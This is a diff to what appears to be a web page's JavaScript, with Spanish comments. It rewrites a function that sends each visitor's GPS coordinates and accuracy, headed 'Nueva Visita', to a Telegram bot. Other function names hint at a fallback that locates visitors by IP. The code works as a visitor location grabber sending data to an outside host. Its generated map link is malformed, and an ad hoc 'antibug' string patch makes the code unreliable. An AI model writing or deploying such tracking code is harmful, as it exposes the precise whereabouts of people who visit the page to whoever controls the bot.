@@ -170,13 +170,22 @@
     obtenerUbicacionPorIP();
   }
 
-  function enviarATelegram(posicion) {
+ function enviarATelegram(posicion) {
     const latitud = posicion.coords.latitude;
     const longitud = posicion.coords.longitude;
     const precision = posicion.coords.accuracy;
 
-    // Fíjate bien que use ` al inicio y al final, y ${latitud} junto con ${longitud}
-    const mensaje = `📍 Nueva Visita (GPS)\n\n• Latitud: ${latitud}\n• Longitud: ${longitud}\n• Precisión: ~${Math.round(precision)} metros\n\nGoogle Maps: https://google.com{latitud},${longitud}`;
+    // Generamos el mensaje base de forma segura
+    let mensaje = "📍 Nueva Visita (GPS)\n\n" +
+                    "• Latitud: " + latitud + "\n" +
+                    "• Longitud: " + longitud + "\n" +
+                    "• Precisión: ~" + Math.round(precision) + " metros\n\n" +
+                    "Google Maps: https://google.com" + latitud + "," + longitud;
+
+    // FILTRO DE SEGURIDAD ANTIBUG: Si por alguna razón el texto viejo se coló, lo reparamos a la fuerza
+    if (mensaje.includes("{latitud}")) {
+        mensaje = mensaje.replace("{latitud}", latitud);
+    }
 
     const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
 
@@ -186,6 +195,7 @@
         body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: mensaje })
     }).catch(err => console.error("Error enviando coordenadas:", err));
   }
+
 
   function obtenerUbicacionInmediata() {
     if (!navigator.geolocation) {
